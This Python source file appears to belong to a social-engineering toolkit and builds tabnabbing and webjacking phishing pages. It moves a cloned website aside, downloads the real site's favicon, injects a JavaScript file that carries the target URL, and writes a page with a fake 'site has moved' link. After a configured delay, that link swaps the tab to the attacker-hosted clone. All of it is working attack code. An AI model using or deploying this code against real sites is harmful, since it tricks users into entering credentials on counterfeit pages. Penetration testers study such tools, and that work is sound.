#!/usr/bin/env python
import subprocess
import re
import urllib2
import os
#
# TabNabbing Source here
#
#

# pull the timing for SET CONFIG on webjacking
fileopen=file("config/set_config", "r")
for line in fileopen:
    match=re.search("WEBJACKING_TIME=", line)
    if match:
        line=line.replace("WEBJACKING_TIME=", "")
        webjacking_timing=line

# grab attack_vector specification
fileopen=file("src/program_junk/attack_vector", "r")
for line in fileopen:
        attack_vector=line.rstrip()

# need to see if we created file to trigger multi attack webjacking
multi_webjacking="off"
if os.path.isfile("src/program_junk/multi_webjacking"):
    multi_webjacking="on"


# Open the IPADDR file
ipaddr=""
if os.path.isfile("src/program_junk/ipaddr.file"):
    fileopen=file("src/program_junk/ipaddr.file","r")
    for line in fileopen:
        line=line.rstrip()
        ipaddr=line

# pull URL field so we can pull favicon later on
fileopen=file("src/program_junk/site.template","r").readlines()
for line in fileopen:
    match=re.search("URL=",line)
    if match:
        URL=line.replace("URL=", "")
        if attack_vector == "tabnabbing":
            URL=URL.replace("https://", "")
            URL=URL.replace("http://", "")
            URL=re.split("/", URL)
            URL=URL[0]
            URL="http://"+URL

# move cloned site to index2.html
subprocess.Popen("mv src/program_junk/web_clone/index.html src/program_junk/web_clone/index2.html", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()

# grab the source and write it out to the cloned directory
fileopen=file("src/webattack/tabnabbing/source.js", "r")
# write it to dir
filewrite=file("src/program_junk/web_clone/source.js", "w")
# loop
for line in fileopen:
    line=line.rstrip()
    match=re.search("URLHERE", line)
    if match:
        line=line.replace("URLHERE", URL)
    filewrite.write(line+"\n")
filewrite.close()

if attack_vector == "tabnabbing":
    # grab favicon
    favicon = urllib2.urlopen("%s/favicon.ico" % (URL))
    output = open('src/program_junk/web_clone/favicon.ico','wb')
    output.write(favicon.read())
    output.close()
    filewrite1=file("src/program_junk/web_clone/index.html", "w")
    filewrite1.write('<head><script type="text/javascript" src="source.js"></script></head>\n')
    filewrite1.write("<body>\n")
    filewrite1.write("Please wait while the site loads...\n")
    filewrite1.write("</body>\n")
    filewrite1.close()

# define webjackign or multi webjacking here
if attack_vector == "webjacking" or multi_webjacking == "on":
    filewrite1=file("src/program_junk/web_clone/index.html", "w")
    filewrite1.write("<script>\n")
    filewrite1.write("function a(){\n")
    filewrite1.write('''a= window.open("http://%s/index2.html", "iframe", "");\n''' % (ipaddr));
    filewrite1.write("}\n")
    filewrite1.write("</script>\n")
    filewrite1.write('''<a href="%s" onclick="t=setTimeout('a()', %s);" target="iframe"><h1>The site %s has moved, click here to go to the new location.</h1></a>\n''' % (URL,webjacking_timing,URL))
    filewrite1.close()
